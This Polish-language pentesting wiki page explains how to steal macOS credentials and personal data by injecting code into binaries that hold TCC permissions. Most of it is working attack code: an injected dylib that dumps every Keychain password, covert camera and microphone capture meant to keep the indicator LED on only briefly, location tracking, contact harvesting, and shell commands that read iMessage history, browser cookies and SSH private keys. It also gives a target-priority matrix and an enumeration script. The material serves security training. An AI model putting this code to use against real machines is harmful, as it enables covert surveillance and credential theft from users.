# Kradzież danych uwierzytelniających i danych w macOS za pośrednictwem uprawnień TCC

{{#include ../../../../banners/hacktricks-training.md}}

## Wprowadzenie

macOS TCC (Transparency, Consent, and Control) chroni dostęp do poufnych danych użytkownika. Gdy attacker **compromises a binary that already has TCC grants**, dziedziczy te uprawnienia. Ta strona opisuje potencjał wykorzystania każdego uprawnienia TCC związanego z kradzieżą danych.<sup>[[2]](#references)</sup>

> [!WARNING]
> Wstrzyknięcie kodu do binary z przyznanymi uprawnieniami TCC (za pośrednictwem DYLD injection, dylib hijacking lub task port) **po cichu dziedziczy wszystkie jego uprawnienia TCC**. Gdy ten sam proces odczytuje chronione dane, nie pojawia się żaden dodatkowy monit ani proces weryfikacji.

---

## Grupy dostępu Keychain

### Łup

macOS Keychain przechowuje:
- **Hasła Wi-Fi** — wszystkie zapisane dane uwierzytelniające sieci bezprzewodowych
- **Hasła do stron internetowych** — hasła z Safari, Chrome (gdy używa Keychain) i innych przeglądarek
- **Hasła aplikacji** — konta e-mail, dane uwierzytelniające VPN, tokeny developerskie
- **Certyfikaty i klucze prywatne** — code signing, TLS klienta, szyfrowanie S/MIME
- **Bezpieczne notatki** — sekrety przechowywane przez użytkownika

### Entitlement: `keychain-access-groups`

Elementy Keychain są zorganizowane w **grupy dostępu**. Entitlement `keychain-access-groups` aplikacji zawiera listę grup, do których może ona uzyskać dostęp:<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Eksploatacja
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Kradzież danych z Keychain
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Dostęp do kamery (kTCCServiceCamera)

### Eksploatacja

Plik binarny z uprawnieniem TCC do kamery (przyznanym za pośrednictwem `kTCCServiceCamera` lub entitlementu `com.apple.security.device.camera`) może przechwytywać zdjęcia i wideo:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Ciche przechwytywanie
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Począwszy od **macOS Sonoma**, wskaźnik kamery na pasku menu jest stały i nie można go programowo ukryć. W **starszych wersjach macOS** krótkie nagranie może nie spowodować pojawienia się zauważalnego wskaźnika.

---

## Dostęp do mikrofonu (kTCCServiceMicrophone)

### Wykorzystanie

Dostęp do mikrofonu przechwytuje cały dźwięk z wbudowanego mikrofonu, zestawu słuchawkowego lub podłączonych urządzeń wejściowych audio:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Atak: Nagrywanie otoczenia
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Śledzenie lokalizacji (kTCCServiceLocation)

### Exploatacja
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Ciągłe śledzenie
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Kontakty / Kalendarz / Zdjęcia

### Eksfiltracja danych osobowych

| Usługa TCC | Framework | Dane |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Imiona i nazwiska, adresy e-mail, numery telefonów, adresy |
| `kTCCServiceCalendar` | `EventKit` | Spotkania, uczestnicy, lokalizacje |
| `kTCCServicePhotos` | `Photos.framework` | Zdjęcia, zrzuty ekranu, metadane lokalizacji |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Pozyskiwanie kontaktów
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Dostęp do konta iCloud

### Uprawnienie: `com.apple.private.icloud-account-access`

To uprawnienie umożliwia komunikację z usługą XPC `com.apple.iCloudHelper`, zapewniając dostęp do:
- **tokenów iCloud** — tokenów uwierzytelniających Apple ID użytkownika
- **iCloud Drive** — zsynchronizowanych dokumentów ze wszystkich urządzeń
- **iCloud Keychain** — haseł synchronizowanych na wszystkich urządzeniach Apple
- **Find My** — lokalizacji wszystkich urządzeń Apple użytkownika<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Compromising an iCloud-entitled binary rozszerza atak z **pojedynczego urządzenia na cały ekosystem Apple**: inne Maci, iPhone'y, iPady, Apple Watch. Synchronizacja iCloud Keychain oznacza, że hasła ze wszystkich urządzeń są dostępne.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### Najpotężniejsze uprawnienie TCC

Full Disk Access zapewnia możliwość odczytu **każdego pliku w systemie**, w tym:
- Danych innych aplikacji (Messages, Mail, historia Safari)
- Baz danych TCC (ujawniających wszystkie pozostałe uprawnienia)
- Kluczy i konfiguracji SSH
- Cookies przeglądarek i tokenów sesji
- Baz danych aplikacji i cache'ów
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Macierz priorytetów Exploitation

Podczas oceny injectable binaries z uprawnieniami TCC ustalaj priorytety według wartości danych:

| Priorytet | Uprawnienie TCC | Dlaczego |
|---|---|---|
| **Krytyczny** | Full Disk Access | Dostęp do wszystkiego |
| **Krytyczny** | TCC Manager | Może nadać dowolne uprawnienie |
| **Wysoki** | Keychain Access Groups | Wszystkie zapisane hasła |
| **Wysoki** | iCloud Account Access | Kompromitacja wielu urządzeń |
| **Wysoki** | Input Monitoring (ListenEvent) | Keylogging |
| **Wysoki** | Accessibility | Kontrola GUI, samodzielne nadawanie uprawnień |
| **Średni** | Screen Capture | Przechwytywanie danych wizualnych |
| **Średni** | Camera + Microphone | Nadzór |
| **Średni** | Contacts + Calendar | Dane do social engineering |
| **Niski** | Location | Śledzenie fizycznej lokalizacji |
| **Niski** | Photos | Dane osobowe |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Odnośniki

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — „Co dzieje się na Twoim Macu, pozostaje w iCloud Apple?!” (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — Eksploatacja TCC](https://objective-see.org/blog/blog_0x4C.html)

{{#include ../../../../banners/hacktricks-training.md}}
